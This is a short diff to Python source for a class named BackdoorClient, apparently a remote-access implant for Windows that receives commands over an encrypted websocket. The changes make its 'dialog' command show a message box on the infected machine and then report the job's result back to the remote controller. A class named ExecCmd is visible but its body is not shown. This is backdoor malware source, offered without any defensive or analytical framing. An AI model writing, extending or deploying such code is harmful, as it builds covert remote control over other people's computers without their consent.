@@ -43,7 +43,7 @@ class BackdoorClient(threading.Thread):
                         command = msg['cmd']
 
                         if command == 'dialog':
-                            ShowDialog(msg)
+                            ShowDialog(msg, self)
 
                 self.ws.close()
 
@@ -87,26 +87,31 @@ class ExecCmd(threading.Thread):
 
 
 class ShowDialog(threading.Thread):
-    def __init__(self, msg):
+    def __init__(self, msg, client):
         threading.Thread.__init__(self)
         self.content = decode2utf(b64decode(msg['content']))
+        print self.content
         self.msg = msg
         self.title = None if not msg['title'] else decode2utf(b64decode(msg['title']))
         if not self.title:
             self.title = u''
+
+        self.client = client
 
         self.daemon = True
         self.start()
 
     def run(self):
         ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
+        to_send_msg = {'to': self.msg['from'], 'jobid': self.msg['jobid'], 'rlt': 'OK'}
+        self.client.ws.send(self.client.encrypt(json.dumps(to_send_msg)))
 
 
 def decode2utf(rawstr):
     if chardet.detect(rawstr)['encoding'] != 'ascii':
         return rawstr.decode('gbk')
     else:
-        return rawstr
+        return rawstr.decode('ascii')
 
 
 def hostname():
